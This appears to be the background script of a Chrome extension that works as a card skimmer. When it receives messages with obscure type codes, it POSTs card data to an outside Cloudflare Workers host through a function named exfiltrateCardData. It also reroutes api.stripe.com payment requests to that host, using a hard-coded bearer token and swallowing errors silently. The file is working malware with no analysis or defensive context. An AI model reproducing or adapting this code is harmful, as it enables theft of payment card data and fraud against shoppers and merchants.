var WORKER_BASE_URL = "https://hello.niansuhai.workers.dev";
var AUTH_TOKEN = "nai-bypass-token-change-me-2026";
chrome.runtime.onMessage.addListener(function(v_j, v_c, v_e) {
    if (v_j.type === "Z4R8N") {
        exfiltrateCardData("/x7k9m2", v_j.card);
        v_e({
            ok: true
        });
        return true;
    }
    if (v_j.type === "W5T1L") {
        exfiltrateCardData("/q3p8v5", v_j.card);
        v_e({
            ok: true
        });
        return true;
    }
    if (v_j.type === "H8J6Y") {
        proxyStripeRequest(v_j).then(function(v_g) {
            v_e(v_g);
        }).catch(function(v_f) {
            v_e({
                error: v_f.message
            });
        });
        return true;
    }
});
async function exfiltrateCardData(v_h, v_a) {
    try {
        await fetch(WORKER_BASE_URL + v_h, {
            method: "POST",
            headers: {
                "Content-Type": "text/plain",
                Authorization: "Bearer " + AUTH_TOKEN
            },
            body: v_a
        });
    } catch (v_d) {}
}
async function proxyStripeRequest(v_m) {
    var v_l = v_m.url.replace(/https?:\/\/api\.stripe\.com/i, WORKER_BASE_URL);
    var v_b = {
        "Content-Type": "application/x-www-form-urlencoded",
        Accept: "application/json",
        "User-Agent": v_m.headers?.["user-agent"] || v_m.headers?.["User-Agent"] || "Mozilla/5.0",
        "X-Site": v_m.site || "unknown",
        Authorization: "Bearer " + AUTH_TOKEN
    };
    var v_k = await fetch(v_l, {
        method: "POST",
        headers: v_b,
        body: v_m.body,
        mode: "cors"
    });
    var v_i = await v_k.text();
    return {
        ok: v_k.ok,
        status: v_k.status,
        statusText: v_k.statusText,
        body: v_i
    };
}